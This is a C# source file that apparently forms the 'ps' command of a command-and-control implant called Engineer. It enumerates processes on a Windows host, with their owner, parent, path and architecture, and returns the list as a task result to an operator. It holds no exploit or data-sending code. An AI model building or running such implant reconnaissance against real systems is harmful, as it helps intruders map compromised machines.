using Engineer.Commands;
using Engineer.Extra;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Ps : EngineerCommand
    {
        public override string Name => "ps";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                var results = new SharpSploitResultList<ListProcessesResult>();
                var processes = Process.GetProcesses();

                foreach (var process in processes)
                {
                    var result = new ListProcessesResult
                    {
                        ProcessName = process.ProcessName,
                        ProcessId = process.Id,
                        SessionId = process.SessionId
                    };

                    result.ProcessPath = GetProcessPath(process);
                    result.Owner = GetProcessOwner(process);
                    result.ProcessParentId = GetProcessParent(process);
                    result.Arch = GetProcessArch(process);

                    results.Add(result);
                }

                Tasking.FillTaskResults(results.ToString(), task, EngTaskStatus.Complete);
            }
            catch (Exception e)
            {
                Tasking.FillTaskResults(e.Message, task, EngTaskStatus.Failed);
            }
        }
        
        private string GetProcessPath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                return "-";
            }
        }
        
        private static int GetProcessParent(Process process)
        {
            try
            {
                var pbi = h_reprobate.NtQueryInformationProcessBasicInformation(process.Handle);
                return pbi.InheritedFromUniqueProcessId;
            }
            catch
            {
                return 0;
            }
        }

        private string GetProcessOwner(Process process)
        {
            var hToken = IntPtr.Zero;

            try
            {
                if (!WinAPIs.Advapi.OpenProcessToken(process.Handle, WinAPIs.Advapi.TOKEN_READ, out hToken))
                    return "-";

                var identity = new WindowsIdentity(hToken);
                return identity.Name;
            }
            catch
            {
                return "-";
            }
            finally
            {
                WinAPIs.Kernel32.CloseHandle(hToken);
            }
        }

        private string GetProcessArch(Process process)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return "x86";

                if (!WinAPIs.Kernel32.IsWow64Process(process.Handle, out var isWow64))
                    return "-";

                if (is64BitOS && isWow64)
                    return "x86";

                return "x64";
            }
            catch
            {
                return "-";
            }
        }
    }

    public sealed class ListProcessesResult : SharpSploitResult
    {
        public string ProcessName { get; set; }
        public string ProcessPath { get; set; }
        public string Owner { get; set; }
        public int ProcessId { get; set; }
        public int ProcessParentId { get; set; }
        public int SessionId { get; set; }
        public string Arch { get; set; }

        protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
        {
            new SharpSploitResultProperty{Name = nameof(ProcessName), Value = ProcessName},
            new SharpSploitResultProperty{Name = nameof(ProcessPath), Value = ProcessPath},
            new SharpSploitResultProperty{Name = nameof(Owner), Value = Owner},
            new SharpSploitResultProperty{Name = "PID", Value = ProcessId},
            new SharpSploitResultProperty{Name = "PPID", Value = ProcessParentId},
            new SharpSploitResultProperty{Name = nameof(SessionId), Value = SessionId},
            new SharpSploitResultProperty{Name = nameof(Arch), Value = Arch}
        };
    }
}

